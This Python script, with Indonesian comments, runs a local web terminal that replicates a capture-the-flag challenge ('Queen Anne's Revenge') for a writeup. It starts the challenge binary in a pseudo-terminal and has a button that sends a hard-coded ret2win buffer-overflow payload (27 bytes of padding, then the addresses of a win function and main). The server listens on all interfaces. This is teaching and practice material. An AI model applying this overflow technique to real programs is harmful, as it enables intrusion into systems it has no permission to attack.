#!/usr/bin/env python3
"""Queen Anne's Revenge - web terminal lokal (replika untuk writeup).
Anak dijalankan lewat PTY supaya perilaku sama seperti remote (prompt live).
"""
import html
import json
import os
import pty
import select
import struct
import subprocess
import termios
import threading
import tty
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import urlparse, parse_qs

BASE = os.path.dirname(os.path.abspath(__file__))
CHALL = os.path.join(BASE, "chall")
PORT = int(os.environ.get("PORT", "1337"))

ACCESS = 0x080491E6
MAIN = 0x080493A5
PAYLOAD = b"A" * 27 + struct.pack("<I", ACCESS) + struct.pack("<I", MAIN) + struct.pack("<I", 1234)


class Session:
    def __init__(self):
        self.lock = threading.Lock()
        self.proc = None
        self.master = None
        self.out = bytearray()

    def spawn(self):
        with self.lock:
            if self.proc is not None and self.proc.poll() is None:
                return
            master, slave = pty.openpty()
            tty.setraw(slave)
            self.proc = subprocess.Popen(
                [CHALL], stdin=slave, stdout=slave, stderr=slave,
                cwd=BASE, close_fds=True, start_new_session=True,
            )
            os.close(slave)
            self.master = master
            self.out.clear()
            threading.Thread(target=self._pump, daemon=True).start()

    def _pump(self):
        m = self.master
        while True:
            r, _, _ = select.select([m], [], [], 0.3)
            if not r:
                if self.proc.poll() is not None:
                    # child mati, ambil sisa & tutup
                    try:
                        while True:
                            b = os.read(m, 4096)
                            if not b:
                                break
                            with self.lock:
                                self.out.extend(b)
                    except OSError:
                        pass
                    return
                continue
            try:
                b = os.read(m, 4096)
            except OSError:
                return
            if not b:
                return
            with self.lock:
                self.out.extend(b)
                if len(self.out) > 200_000:
                    del self.out[: len(self.out) - 100_000]

    def send(self, data: bytes):
        self.spawn()
        try:
            os.write(self.master, data)
        except OSError:
            pass

    def reset(self):
        with self.lock:
            p, m = self.proc, self.master
            self.proc = None
            self.master = None
            self.out.clear()
        if p is not None:
            try:
                p.kill()
            except Exception:
                pass
        if m is not None:
            try:
                os.close(m)
            except OSError:
                pass

    def is_dead(self):
        return self.proc is not None and self.proc.poll() is not None

    def since(self, pos):
        with self.lock:
            if pos > len(self.out):
                pos = 0
            seg = bytes(self.out[pos:])
            return seg, len(self.out), self.is_dead()


S = Session()

PAGE = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Queen Anne's Revenge - local replica</title>
<style>
  body { margin:0; background:#0d1117; color:#c9d1d9;
         font-family: ui-monospace, Consolas, Menlo, monospace; }
  .wrap { max-width: 880px; margin: 0 auto; padding: 18px; }
  h1 { font-size: 17px; color: #f0b429; margin: 4px 0 2px; }
  .sub { color:#8b949e; font-size:12px; margin-bottom:10px; }
  #term { background:#010409; border:1px solid #30363d; border-radius:8px;
          height: 55vh; overflow-y:auto; padding:12px; font-size:13px;
          line-height:1.45; white-space:pre-wrap; word-break:break-word; }
  .fl { color:#7ee787; font-weight:bold; }
  .dim { color:#8b949e; }
  .bar { display:flex; gap:8px; margin-top:10px; }
  input { flex:1; background:#0d1117; border:1px solid #30363d; color:#c9d1d9;
          border-radius:6px; padding:8px 10px; font-family:inherit; font-size:13px; }
  button { background:#21262d; border:1px solid #30363d; color:#c9d1d9;
           border-radius:6px; padding:8px 12px; font-family:inherit; font-size:13px; cursor:pointer; }
  button:hover { background:#30363d; }
  #auto { background:#1f6feb; border-color:#1f6feb; color:#fff; }
  .hint { color:#8b949e; font-size:12px; margin-top:8px; }
</style>
</head>
<body>
<div class="wrap">
  <h1>QUEEN ANNE'S REVENGE — Brig Treasure</h1>
  <div class="sub">Replika lokal (ELF 32-bit, no PIE, no canary) &mdash; flag di flag.txt &mdash; source: main.c</div>
  <div id="term"><span class="dim">$ nc 127.0.0.1 1337</span></div>
  <div class="bar">
    <input id="inp" placeholder="ketik input buat program (contoh: blackbeard) lalu Enter..." autocomplete="off">
    <button onclick="sendLine()">Kirim</button>
    <button onclick="runExploit()" id="auto">Jalankan Exploit</button>
    <button onclick="resetSrv()">Reset</button>
  </div>
  <div class="hint">Tombol Exploit = kirim payload ret2win ('A'*27 + access@0x080491e6 + main + arg 1234), lalu PIN bebas.</div>
</div>
<script>
const term = document.getElementById('term');
const inp = document.getElementById('inp');
let last = 0, deadFlag = false;

function esc(s){ return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
function fmt(s){ return esc(s).replace(/(JCC\\{[^}]*\\})/g,'<span class="fl">$1</span>'); }

function append(s){
  term.innerHTML += fmt(s);
  term.scrollTop = term.scrollHeight;
  if(term.innerHTML.length > 400000) term.innerHTML = term.innerHTML.slice(-250000);
}

async function poll(){
  try{
    const r = await fetch('/poll?since=' + last);
    const j = await r.json();
    if(j.out){ append(j.out); }
    last = j.total;
    if(j.dead && !deadFlag){ deadFlag = true; append('\\n<span class="dim">[koneksi ditutup]</span>\\n'); }
  }catch(e){}
}
setInterval(poll, 250);

async function sendLine(){
  const v = inp.value;
  if(!v) return;
  inp.value = '';
  append('> ' + esc(v) + '\\n');
  await fetch('/send?line=' + encodeURIComponent(v));
}
inp.addEventListener('keydown', e => { if(e.key === 'Enter') sendLine(); });

async function runExploit(){
  append('\\n<span class="dim">$ python3 exploit.py 127.0.0.1 1337</span>\\n');
  await fetch('/exploit');
}
async function resetSrv(){
  term.innerHTML = '<span class="dim">$ nc 127.0.0.1 1337</span>';
  last = 0; deadFlag = false;
  await fetch('/reset');
}
</script>
</body>
</html>
"""


class H(BaseHTTPRequestHandler):
    def log_message(self, *a):
        pass

    def _send(self, code, body, ctype):
        data = body.encode("utf-8") if isinstance(body, str) else body
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(data)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(data)

    def do_GET(self):
        u = urlparse(self.path)
        if u.path == "/":
            return self._send(200, PAGE, "text/html; charset=utf-8")
        if u.path == "/poll":
            q = parse_qs(u.query)
            try:
                since = int(q.get("since", ["0"])[0])
            except ValueError:
                since = 0
            seg, total, dead = S.since(since)
            return self._send(200, json.dumps({"out": seg.decode("utf-8", "replace"),
                                               "total": total, "dead": dead}),
                              "application/json")
        if u.path == "/send":
            q = parse_qs(u.query)
            line = q.get("line", [""])[0]
            S.send(line.encode("utf-8") + b"\n")
            return self._send(200, "{}", "application/json")
        if u.path == "/reset":
            S.reset()
            return self._send(200, "{}", "application/json")
        if u.path == "/exploit":
            S.reset()
            S.send(PAYLOAD + b"\n")
            S.send(b"1\n")
            return self._send(200, "{}", "application/json")
        return self._send(404, "not found", "text/plain")

    do_POST = do_GET


if __name__ == "__main__":
    srv = ThreadingHTTPServer(("0.0.0.0", PORT), H)
    srv.daemon_threads = True
    print(f"listening on {PORT}")
    srv.serve_forever()
